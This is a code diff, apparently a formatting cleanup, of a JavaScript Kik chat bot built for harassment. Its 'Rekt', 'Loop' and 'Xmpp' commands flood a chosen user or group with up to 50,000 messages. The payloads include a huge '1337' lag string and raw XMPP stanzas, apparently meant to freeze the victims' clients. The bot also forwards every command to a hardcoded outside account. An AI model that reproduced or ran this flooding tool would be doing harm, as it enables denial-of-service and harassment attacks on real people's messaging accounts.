@@ -34,7 +34,7 @@ const Kik = new KikClient({
 async function webXmpp(stan, num, vic) {
   let numb = 0;
   while (numb <= num) {
-    console.log(stan)
+    console.log(stan);
     Kik.sendXmpp(vic, stan);
     await new Promise(resolve => setTimeout(resolve, delay));
     numb += 1;
@@ -95,8 +95,7 @@ let lag1 =
   "133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713++l";
 let delay = 150;
 
-let lag2 =
-  "REKT BY PLAGUES"
+let lag2 = "REKT BY PLAGUES";
 
 /*PRIVATE EVENTS*/
 Kik.on("receivedprivatemsg", async (sender, msg) => {
@@ -105,12 +104,12 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
 
   if (msgParts[0] == "Xmpp" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
-            // Kik.sendXmpp("oooweeoo_tis@talk.kik.com", msg);
+      // Kik.sendXmpp("oooweeoo_tis@talk.kik.com", msg);
       // Kik.sendXmpp('unclefunkle01_ap0@talk.kik.com', msg);
       Kik.sendXmpp("fuckdavid___ym7@talk.kik.com", msg);
       let numb = 0;
       while (numb <= parseInt(msgParts[2])) {
-       await Kik.sendXmpp(msgParts[1], decode(msgNL[1]));
+        await Kik.sendXmpp(msgParts[1], decode(msgNL[1]));
         await new Promise(resolve => setTimeout(resolve, delay));
         numb += 1;
       }
@@ -127,20 +126,20 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
- 
-  
-    if (msgParts[0] == "Send" && msgParts[1] == "link") {
+
+  if (msgParts[0] == "Send" && msgParts[1] == "link") {
     let mess = "https://button-slime-mascara.glitch.me/ ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
-  
+
   if (msgParts[0] == "Bot" && msgParts[1] == "commands") {
-    let mess = "Bot commands:                                                               Check bot / Send link / Rekt jid 5-50000 / Loop jid 5-50000 / Xmpp loop / Ezy / Add me ";
+    let mess =
+      "Bot commands:                                                               Check bot / Send link / Rekt jid 5-50000 / Loop jid 5-50000 / Xmpp loop / Ezy / Add me ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
-  
+
   if (msgParts[0] == "Check" && msgParts[1] == "bot") {
     let mess = "Bot online ";
     await Kik.sendMessage(sender.jid, mess);
@@ -152,20 +151,20 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
-  
+
   if (msgParts[0] == "Ezy") {
     let mess = "My creator also a troll God <3 ";
     await Kik.sendMessage(sender.jid, mess);
     return;
   }
-  
+
   if (msgParts[0] == "Rekt" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
       // Kik.sendMessage("oooweooo_tis@talk.kik.com", msg);
       // Kik.sendMessage('uncefumnkle01_ap0@talk.kik.com', msg);
       Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
       let mess = "Attack started ";
-    await Kik.sendMessage(sender.jid, mess);
+      await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag2);
@@ -183,7 +182,7 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
       // Kik.sendMessage('uncefjunkle01_ap0@talk.kik.com', msg);
       Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
       let mess = "Attack started ";
-    await Kik.sendMessage(sender.jid, mess);
+      await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag2);
@@ -194,14 +193,14 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     })();
     return;
   }
-  
+
   if (msgParts[0] == "Loop" && msgParts[1].endsWith("@groups.kik.com")) {
     (async () => {
       // Kik.sendMessage("oooweolo_tis@talk.kik.com", msg);
       // Kik.sendMessage('uncejfunkle01_ap0@talk.kik.com', msg);
       Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
       let mess = "Attack started ";
-    await Kik.sendMessage(sender.jid, mess);
+      await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag1);
@@ -212,14 +211,14 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
     })();
     return;
   }
-  
+
   if (msgParts[0] == "Loop" && msgParts[1].endsWith(".kik.com")) {
     (async () => {
       // Kik.sendMessage("oooweoo_tisl@talk.kik.com", msg);
       // Kik.sendMessage('uncefunklye01_ap0@talk.kik.com', msg);
       Kik.sendMessage("fuckdavidd___ym7@talk.kik.com", msg);
       let mess = "Attack started ";
-    await Kik.sendMessage(sender.jid, mess);
+      await Kik.sendMessage(sender.jid, mess);
       let numb = 0;
       while (numb <= msgParts[2]) {
         await Kik.sendMessage(msgParts[1], lag1);
@@ -227,18 +226,17 @@ Kik.on("receivedprivatemsg", async (sender, msg) => {
         numb += 1;
       }
       // await Kik.forceAdmin(sender.jid);
-     })();
+    })();
     return;
   }
 });
-  
+
 Kik.on("privatetyping", (sender, isTyping) => {
   if (isTyping) {
     console.log(`PRIVATE: ${sender.jid} is typing`);
   } else {
     console.log(`PRIVATE: ${sender.jid} stopped typing`);
   }
-  
 });
 
 // listen for requests :)
